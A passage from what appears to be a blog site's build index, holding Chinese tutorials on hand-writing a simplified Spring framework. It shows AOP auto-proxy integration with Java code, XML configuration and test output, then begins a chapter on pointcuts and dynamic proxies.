InstantiationAwareBeanPostProcessor, BeanFactoryAware {\n\n    private DefaultListableBeanFactory beanFactory;\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        this.beanFactory = (DefaultListableBeanFactory) beanFactory;\n    }\n\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        if (isInfrastructureClass(beanClass)) {\n            return null;\n        }\n\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            if (classFilter != null && !classFilter.matches(beanClass)) {\n                continue;\n            }\n            // 转换为代理对象返回\n            TargetSource targetSource = null;\n            try {\n                targetSource = new TargetSource(beanClass.getDeclaredConstructor().newInstance());\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            advisedSupport.setTargetSource(targetSource);\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            // 是否使用 cglib 代理，这里先写死为 true，后续根据目标类动态改造\n            advisedSupport.setProxyTargetClass(true);\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return null;\n    }\n\n    private boolean isInfrastructureClass(Class<?> beanClass) {\n        return Advice.class.isAssignableFrom(beanClass) || Pointcut.class.isAssignableFrom(beanClass) || Advisor.class.isAssignableFrom(beanClass);\n    }\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 将实现加入原有的逻辑中\n\n 1. 修改 AbstractAutowireCapableBeanFactory，在创建 bean 时，与 spring 整合。\n\n    @Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 这里加入逻辑：判断是否返回 代理 Bean 对象\n            bean = resolveBeforeInstantiation(beanName, beanDefinition);\n            if (bean != null) {\n                return bean;\n            }\n\n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n            // 属性填充\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 添加 Bean 的初始化扩展\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Failed to bean:[" + beanName + "] instance", e);\n        }\n        // 添加单例 Bean 缓存\n        if (beanDefinition.isSingleton()) {\n            // 注册实现了 DisposableBean 接口的 单例Bean 对象，留待容器停止的时候调用。\n            registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            addSingleton(beanName, bean);\n        }\n        return bean;\n    }\n\n    protected Object resolveBeforeInstantiation(String beanName, BeanDefinition beanDefinition) {\n        // 前置方法，尝试获取一个代理对象\n        Object bean = applyBeanPostProcessorsBeforeInstantiation(beanDefinition.getBeanClass(), beanName);\n        if (bean != null) {\n            // 如果生成了目标代理对象，后续只有 postProcessAfterInitialization 方法会调用，其它方法不再调用\n            bean = applyBeanPostProcessorsAfterInitialization(bean, beanName);\n        }\n        return bean;\n    }\n\n    protected Object applyBeanPostProcessorsBeforeInstantiation(Class<?> beanClass, String beanName) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                Object result = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).postProcessBeforeInstantiation(beanClass, beanName);\n                if (null != result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 测试\n\n * xml 准备，spring-advice.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean id="tiger" class="com.snail.springframework.beans.factory.bean.Tiger">\n        <property name="name" value="name-xml-init-wow!"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="tigerAdvice" class="com.snail.springframework.aop.aspectj.TigerAdvice"/>\n    <bean id="methodInterceptor" class="com.snail.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="methodBeforeAdvice" ref="tigerAdvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="advice" ref="methodInterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.beans.factory.bean.Tiger.*(..))"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n * 提前准备\n   \n   TigerAdvice\n\npublic class TigerAdvice implements MethodBeforeAdvice {\n\n    @Override\n    public void before(Method method, Object[] args, Object target) throws Throwable {\n        System.out.println("TigerAdvice method before() -> method:" + method.getName() + "(), args:" + JSONUtil.toJsonStr(args));\n        System.out.println("TigerAdvice method before() -> 前置aop, 进行一些操作, sleep(2000)");\n        Thread.sleep(2000);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 测试类\n\n    /**\n     * aop 和 spring 整合测试\n     */\n    @Test\n    public void aopSpringAdviceTest() {\n        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:spring-advice.xml");\n        Tiger proxy = (Tiger) context.getBean("tiger");\n        System.out.println("------------------" + DateUtil.now());\n        proxy.setName("wow^^ hu~ Proxy");\n        System.out.println("------------------" + DateUtil.now());\n        // debug 查看是是否代理类：Tiger$$EnhancerByCGLIB$$ced6ff89@1860\n        System.out.println("proxy tiger name:" + proxy.getAnimalName());\n        System.out.println("------------------" + DateUtil.now());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试结果\n\n------------------2023-07-17 17:35:40\nTigerAdvice method before() -> method:setName(), args:["wow^^ hu~ Proxy"]\nTigerAdvice method before() -> 前置aop, 进行一些操作, sleep(2000)\n------------------2023-07-17 17:35:42\nTigerAdvice method before() -> method:getAnimalName(), args:[]\nTigerAdvice method before() -> 前置aop, 进行一些操作, sleep(2000)\nproxy tiger name:wow^^ hu~ Proxy\n------------------2023-07-17 17:35:44\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\nAOP（面向切面编程）和 Spring 容器的整合是 Spring Framework 提供的一项重要功能。通过将 AOP 和 Spring 容器结合使用，可以实现横切关注点的处理，提高代码的模块化和复用性，以及增强应用程序的可维护性和可扩展性。\n\n在 AOP 和 Spring 容器的整合过程中，关键点包括：\n\n 1. 切面定义：通过定义切面类，其中包含切面逻辑（Advice）和切入点（Pointcut），来描述切面。\n 2. 切点解析：切入点是一个表达式，用于确定在哪些方法或位置应用切面逻辑。\n 3. 代理模式：Spring 使用代理模式来实现切面逻辑的织入。它通过动态创建代理对象并将切面逻辑织入到目标对象中。\n 4. 代理创建和织入：对于实现接口的目标对象，Spring 使用 JDK 动态代理；对于没有实现接口的目标对象，Spring 使用 CGLIB 代理。\n 5. AOP 配置：通过注解、XML 配置或基于 Java 的配置，开发者可以定义切面类、建议、切入点和切点表达式，以及指定目标对象和要织入的切面逻辑。',normalizedContent:'我们先大致了解正常在 spring 容器中使用 aop 的基本步骤：\n\n 1. 定义切面类：创建一个切面类，该类包含了切面逻辑（advice）和切入点（pointcut）。切面逻辑定义了要在切入点处执行的逻辑，而切入点定义了在哪些方法或位置应用该切面逻辑。\n 2. 配置切面类：在 spring 配置文件（如 xml 配置文件）中，声明切面类作为一个 bean，并配置其相关属性，例如切面逻辑和切入点。\n 3. 使用 aop 功能：在应用程序中，可以直接使用被代理的 bean，并在其方法上应用切面逻辑。当方法被调用时，aop 将拦截相应的切入点，并执行切面逻辑中定义的逻辑。\n\n而 aop 和 spring 容器的整合，如上就是我们最终封装之后，对外暴露的流程。\n\n\n\n * 解析\n * 进一步封装 aop\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 与 spring 整合\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n主要就是对上一篇 aop 的进一步封装。与 spring 整合 abstractautowirecapablebeanfactory.createbean 在创建 bean 时，在实例化 bean 之前判断是否需要代理，通过 instantiationawarebeanpostprocessor 查找所有的需要被代理的类和当前类比较，如果当前类需要被代理则创建代理类返回（不走正常的实例化逻辑了）；\n\n\n# 进一步封装 aop\n\n\n# 定义一些职责和能力\n\n 1. advisor\n    \n    一个 aop 操作的访问者，持有要执行的具体操作。\n\npublic interface advisor {\n\n    /**\n     * 获取一个准备好的 aop 执行器\n     *\n     * @return {@link advice}\n     */\n    advice getadvice();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n 2. beforeadvice，methodbeforeadvice\n    \n    methodbeforeadvice 用于在目标方法执行之前执行一些额外的逻辑操作（在 spring 框架中，advice 都是通过方法拦截器 methodinterceptor 实现的。环绕 advice 类似一个拦截器的链路，before advice、after advice等。这里简单只做一个methodbeforeadvice前置拦截）。\n    \n    通过实现 methodbeforeadvice 接口，开发人员可以在目标方法执行之前插入自定义的行为，比如日志记录、权限验证、事务管理等。\n\npublic interface beforeadvice extends advice {\n\n}\n\n\n1\n2\n3\n\n\npublic interface methodbeforeadvice extends beforeadvice {\n\n    /**\n     * aop 方法前置操作\n     *\n     * @param method 目标方法\n     * @param args   目标方法参数\n     * @param target 目标对象，可能是空\n     * @throws throwable throwable\n     */\n    void before(method method, object[] args, object target) throws throwable;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n 3. pointcutadvisor\n    \n    切入点访问者，pointcutadvisor 承担了 pointcut 和 advice *的组合，*pointcut 用于获取 joinpoint，而 advice 决定于 joinpoint 执行什么操作。\n\npublic interface pointcutadvisor extends advisor {\n\n    /**\n     * 获取一个切入点\n     *\n     * @return {@link pointcut}\n     */\n    pointcut getpointcut();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. aspectjexpressionpointcutadvisor 切面拦截器\n    \n    将切面表达式，切面，匹配后的执行操作进行封装实现，后续就可以配置为一个 bean 加载到容器中方便使用了。\n\npublic class aspectjexpressionpointcutadvisor implements pointcutadvisor {\n\n    private advice advice;\n\n    private string expression;\n\n    private aspectjexpressionpointcut aspectjexpressionpointcut;\n\n    public void setadvice(advice advice) {\n        this.advice = advice;\n    }\n\n    public void setexpression(string expression) {\n        this.expression = expression;\n    }\n\n    @override\n    public advice getadvice() {\n        return advice;\n    }\n\n    @override\n    public pointcut getpointcut() {\n        if (aspectjexpressionpointcut == null) {\n            aspectjexpressionpointcut = new aspectjexpressionpointcut(expression);\n        }\n        return aspectjexpressionpointcut;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n 2. methodbeforeadviceinterceptor 方法前置拦截器\n    \n    对方法拦截器的适配，将拦截到的方法，执行前后交由 spring 处理。\n    \n    这里处理了执行前交由 methodbeforeadvice 处理。\n\npublic class methodbeforeadviceinterceptor implements methodinterceptor {\n\n    private methodbeforeadvice methodbeforeadvice;\n\n    public methodbeforeadviceinterceptor() {\n\n    }\n\n    public methodbeforeadviceinterceptor(methodbeforeadvice methodbeforeadvice) {\n        this.methodbeforeadvice = methodbeforeadvice;\n    }\n\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        methodbeforeadvice.before(invocation.getmethod(), invocation.getarguments(), invocation.getthis());\n        return invocation.proceed();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n 3. proxyfactory 代理工厂\n    \n    选择 jdk 还是 cglib 代理。\n\npublic class proxyfactory {\n\n    private final advisedsupport advisedsupport;\n\n    public proxyfactory(advisedsupport advisedsupport) {\n        this.advisedsupport = advisedsupport;\n    }\n\n    public object getproxy() {\n        return createaopproxy().getproxy();\n    }\n\n    private aopproxy createaopproxy() {\n        if (advisedsupport.isproxytargetclass()) {\n            return new cglib2aopproxy(advisedsupport);\n        }\n        return new jdkdynamicaopproxy(advisedsupport);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 将实现加入原有的逻辑中\n\n * 原有类修改，advisedsupport（主要是用于把代理、拦截、匹配的各项属性包装到一个类中，方便在 aopproxy 实现类进行使用。），添加通过什么方式代理。\n\n    /**\n     * 是否通过 类 代理对象（cglib代理？true：false）\n     */\n    private boolean proxytargetclass = false;\n\n    public boolean isproxytargetclass() {\n        return proxytargetclass;\n    }\n\n    public void setproxytargetclass(boolean proxytargetclass) {\n        this.proxytargetclass = proxytargetclass;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 测试\n\n * 测试类\n\n无\n\n\n1\n\n * 测试结果\n\n无\n\n\n1\n\n\n\n# 与 spring 整合\n\n\n# 定义一些职责和能力\n\n 1. instantiationawarebeanpostprocessor\n    \n    扩展自 beanpostprocessor，接口的主要作用在于：目标对象的实例化过程中需要处理的事情，包括实例化对象的前后过程以及实例的属性设置。\n\npublic interface instantiationawarebeanpostprocessor extends beanpostprocessor {\n\n    /**\n     * 在目标对象实例化之前调用，该方法的返回值类型是object，我们可以返回任何类型的值。\n     * 由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成的目标对象的实例(比如代理对象)。\n     * 如果该方法的返回值代替原本该生成的目标对象，后续只有postprocessafterinitialization方法会调用，其它方法不再调用；否则按照正常的流程走。\n     */\n    object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 具体的实现\n\n 1. defaultadvisorautoproxycreator\n    \n    defaultadvisorautoproxycreator 是 spring framework 中的一个类，负责根据配置的 advisors 自动为 bean 创建代理。它会扫描 bean，查找任何配置的 advisors，并在必要时为这些 bean 创建动态代理。\n    \n    在 spring framework 中，advisors 是定义切面逻辑（advice）的对象，例如拦截方法调用以应用额外的行为。\n    \n    它的工作原理如下：\n    \n    1. defaultadvisorautoproxycreator 在初始化阶段检查应用上下文中的所有 bean。\n    2. 它查找配置了 advisors 的 bean。一个 advisor 通常由切面逻辑（advice）和切入点（pointcut）组成，切入点用于指定切面逻辑应该应用的位置。\n    3. 对于每个配置了 advisors 的 bean，defaultadvisorautoproxycreator 创建一个代理对象，该代理对象包装了原始的 bean。\n    4. 代理对象拦截对 bean 的方法调用，并应用配置的 advisors 定义的切面逻辑。\n    5. 当应用上下文中的其他 bean 请求原始 bean 时，它们将接收代理对象而不是原始对象。\n\npublic class defaultadvisorautoproxycreator implements instantiationawarebeanpostprocessor, beanfactoryaware {\n\n    private defaultlistablebeanfactory beanfactory;\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        this.beanfactory = (defaultlistablebeanfactory) beanfactory;\n    }\n\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        if (isinfrastructureclass(beanclass)) {\n            return null;\n        }\n\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            if (classfilter != null && !classfilter.matches(beanclass)) {\n                continue;\n            }\n            // 转换为代理对象返回\n            targetsource targetsource = null;\n            try {\n                targetsource = new targetsource(beanclass.getdeclaredconstructor().newinstance());\n            } catch (exception e) {\n                e.printstacktrace();\n            }\n            advisedsupport advisedsupport = new advisedsupport();\n            advisedsupport.settargetsource(targetsource);\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            // 是否使用 cglib 代理，这里先写死为 true，后续根据目标类动态改造\n            advisedsupport.setproxytargetclass(true);\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return null;\n    }\n\n    private boolean isinfrastructureclass(class<?> beanclass) {\n        return advice.class.isassignablefrom(beanclass) || pointcut.class.isassignablefrom(beanclass) || advisor.class.isassignablefrom(beanclass);\n    }\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 将实现加入原有的逻辑中\n\n 1. 修改 abstractautowirecapablebeanfactory，在创建 bean 时，与 spring 整合。\n\n    @override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 这里加入逻辑：判断是否返回 代理 bean 对象\n            bean = resolvebeforeinstantiation(beanname, beandefinition);\n            if (bean != null) {\n                return bean;\n            }\n\n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n            // 属性填充\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 添加 bean 的初始化扩展\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("failed to bean:[" + beanname + "] instance", e);\n        }\n        // 添加单例 bean 缓存\n        if (beandefinition.issingleton()) {\n            // 注册实现了 disposablebean 接口的 单例bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            addsingleton(beanname, bean);\n        }\n        return bean;\n    }\n\n    protected object resolvebeforeinstantiation(string beanname, beandefinition beandefinition) {\n        // 前置方法，尝试获取一个代理对象\n        object bean = applybeanpostprocessorsbeforeinstantiation(beandefinition.getbeanclass(), beanname);\n        if (bean != null) {\n            // 如果生成了目标代理对象，后续只有 postprocessafterinitialization 方法会调用，其它方法不再调用\n            bean = applybeanpostprocessorsafterinitialization(bean, beanname);\n        }\n        return bean;\n    }\n\n    protected object applybeanpostprocessorsbeforeinstantiation(class<?> beanclass, string beanname) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                object result = ((instantiationawarebeanpostprocessor) beanpostprocessor).postprocessbeforeinstantiation(beanclass, beanname);\n                if (null != result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 测试\n\n * xml 准备，spring-advice.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean id="tiger" class="com.snail.springframework.beans.factory.bean.tiger">\n        <property name="name" value="name-xml-init-wow!"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="tigeradvice" class="com.snail.springframework.aop.aspectj.tigeradvice"/>\n    <bean id="methodinterceptor" class="com.snail.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="methodbeforeadvice" ref="tigeradvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="advice" ref="methodinterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.beans.factory.bean.tiger.*(..))"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n * 提前准备\n   \n   tigeradvice\n\npublic class tigeradvice implements methodbeforeadvice {\n\n    @override\n    public void before(method method, object[] args, object target) throws throwable {\n        system.out.println("tigeradvice method before() -> method:" + method.getname() + "(), args:" + jsonutil.tojsonstr(args));\n        system.out.println("tigeradvice method before() -> 前置aop, 进行一些操作, sleep(2000)");\n        thread.sleep(2000);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 测试类\n\n    /**\n     * aop 和 spring 整合测试\n     */\n    @test\n    public void aopspringadvicetest() {\n        classpathxmlapplicationcontext context = new classpathxmlapplicationcontext("classpath:spring-advice.xml");\n        tiger proxy = (tiger) context.getbean("tiger");\n        system.out.println("------------------" + dateutil.now());\n        proxy.setname("wow^^ hu~ proxy");\n        system.out.println("------------------" + dateutil.now());\n        // debug 查看是是否代理类：tiger$$enhancerbycglib$$ced6ff89@1860\n        system.out.println("proxy tiger name:" + proxy.getanimalname());\n        system.out.println("------------------" + dateutil.now());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试结果\n\n------------------2023-07-17 17:35:40\ntigeradvice method before() -> method:setname(), args:["wow^^ hu~ proxy"]\ntigeradvice method before() -> 前置aop, 进行一些操作, sleep(2000)\n------------------2023-07-17 17:35:42\ntigeradvice method before() -> method:getanimalname(), args:[]\ntigeradvice method before() -> 前置aop, 进行一些操作, sleep(2000)\nproxy tiger name:wow^^ hu~ proxy\n------------------2023-07-17 17:35:44\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\naop（面向切面编程）和 spring 容器的整合是 spring framework 提供的一项重要功能。通过将 aop 和 spring 容器结合使用，可以实现横切关注点的处理，提高代码的模块化和复用性，以及增强应用程序的可维护性和可扩展性。\n\n在 aop 和 spring 容器的整合过程中，关键点包括：\n\n 1. 切面定义：通过定义切面类，其中包含切面逻辑（advice）和切入点（pointcut），来描述切面。\n 2. 切点解析：切入点是一个表达式，用于确定在哪些方法或位置应用切面逻辑。\n 3. 代理模式：spring 使用代理模式来实现切面逻辑的织入。它通过动态创建代理对象并将切面逻辑织入到目标对象中。\n 4. 代理创建和织入：对于实现接口的目标对象，spring 使用 jdk 动态代理；对于没有实现接口的目标对象，spring 使用 cglib 代理。\n 5. aop 配置：通过注解、xml 配置或基于 java 的配置，开发者可以定义切面类、建议、切入点和切点表达式，以及指定目标对象和要织入的切面逻辑。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 09 - 核心增强，AOP实现",frontmatter:{title:"手写 Spring 09 - 核心增强，AOP实现",date:"2023-10-13T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-09.html",relativePath:"views/backend/spring-source-09.md",key:"v-6854f992",path:"/views/backend/spring-source-09.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:278},{level:2,title:"实现切面表达式",slug:"实现切面表达式",normalizedTitle:"实现切面表达式",charIndex:284},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:297},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:312},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:323},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:237},{level:2,title:"封装动态代理",slug:"封装动态代理",normalizedTitle:"封装动态代理",charIndex:346},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力",charIndex:297},{level:3,title:"具体的实现",slug:"具体的实现-2",normalizedTitle:"具体的实现",charIndex:312},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中",charIndex:323},{level:3,title:"测试",slug:"测试-2",normalizedTitle:"测试",charIndex:237},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:407}],excerpt:"<Boxx/>\n<p>这个文档讨论了如何使用 Spring AOP 实现动态代理。它包括了 AspectJExpressionPointcut、TargetSource、AdvisedSupport、ReflectiveMethodInvocation、AopProxy、JdkDynamicAopProxy 和 Cglib2AopProxy 等类的实现。</p>\n<p>此外，文档还提供了一个 TigerInterceptor 类，该类演示了如何在代理对象上拦截方法调用并执行增强逻辑。最后，文档提供了一个测试类，该类演示了如何使用 Spring AOP 创建动态代理对象。</p>\n",headersStr:"解析 实现切面表达式 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 封装动态代理 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:'这个文档讨论了如何使用 Spring AOP 实现动态代理。它包括了 AspectJExpressionPointcut、TargetSource、AdvisedSupport、ReflectiveMethodInvocation、AopProxy、JdkDynamicAopProxy 和 Cglib2AopProxy 等类的实现。\n\n此外，文档还提供了一个 TigerInterceptor 类，该类演示了如何在代理对象上拦截方法调用并执行增强逻辑。最后，文档提供了一个测试类，该类演示了如何使用 Spring AOP 创建动态代理对象。\n\n\n\n * 解析\n * 实现切面表达式\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 封装动态代理\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\nAOP 的实现，最主要的核心就是切面表达式和动态代理。切面表达式匹配到指定的切面，再交由不用的代理（jdk 或 cglib）来实现。而他们的实现已经由 aspectj 、jdk 、 cglib 实现了，我们所作的就是封装他们的复杂性，将一个简单的类或功能暴露出来。\n\n切面表达式：使用 aspectj 的 org.aspectj.weaver.tools.PointcutExpression\n\n动态代理：将 jdk 和 cglib 的代理统一由 aopalliance 的 org.aopalliance.intercept.MethodInterceptor 和 org.aopalliance.intercept.MethodInvocation 实现（换句话说，aopalliance 将方法的调用转发到不同的代理实现中）。\n\n这样对用户来说，只需 ① 自己定义一个切面表达式和 ② 自己实现 MethodInvocation 来实现切面，简单了用户操作，屏蔽了底层实现。\n\n\n# 实现切面表达式\n\n切面表达式就一个作用：过滤出指定的类和方法。\n\n\n# 定义一些职责和能力\n\n 1. Pointcut\n    \n    Pointcut 接口是 Spring 框架 AOP（面向切面编程）的一个核心接口，它用于描述一组需要被拦截的方法或类。\n    \n    在 Spring 中，Pointcut 可以被看作是一个逻辑切面，它包含了需要被增强的方法和类的信息，并可以根据这些信息来决定哪些方法需要被拦截和增强。\n\npublic interface Pointcut {\n\n    /**\n     * 获取类过滤器\n     * 类过滤器用于对目标类进行筛选和匹配，以便确定哪些类需要被代理和增强；\n     *\n     * @return {@link ClassFilter}\n     */\n    ClassFilter getClassFilter();\n\n    /**\n     * 获取方法匹配器\n     * 方法匹配器用于对目标类的方法进行筛选和匹配，以便确定哪些方法需要被拦截和增强；\n     *\n     * @return {@link MethodMatcher}\n     */\n    MethodMatcher getMethodMatcher();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n 2. ClassFilter\n    \n    在 AOP 中，ClassFilter 用于在 BeanFactory 和 ApplicationContext 中过滤出需要被代理的类，主要作用是对目标类进行筛选和匹配，以便确定哪些类需要被代理和增强。\n    \n    例如，在 Spring AOP 中，可以使用切点（Pointcut）来定义一个需要拦截的切点，然后使用 ClassFilter 对目标类进行筛选和匹配。\n    \n    * 在匹配过程中，Spring 将会遍历所有的类，将每个类传递给 ClassFilter 的 matches 方法进行匹配。\n    \n    * 如果这个类符合条件，则将其加入到代理列表中，否则跳过不处理。\n\npublic interface ClassFilter {\n\n    /**\n     * 用于判断指定的 Class 对象是否符合条件\n     *\n     * @param clazz clazz\n     * @return boolean\n     */\n    boolean matches(Class<?> clazz);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n 3. MethodMatcher\n    \n    在 AOP 中，MethodMatcher 主要作用是对目标类的方法进行筛选和匹配，以便确定哪些方法需要被拦截和增强。通常情况下，MethodMatcher 总是和 ClassFilter 一起使用，以实现更加细粒度的 AOP 控制。\n    \n    例如，在 Spring 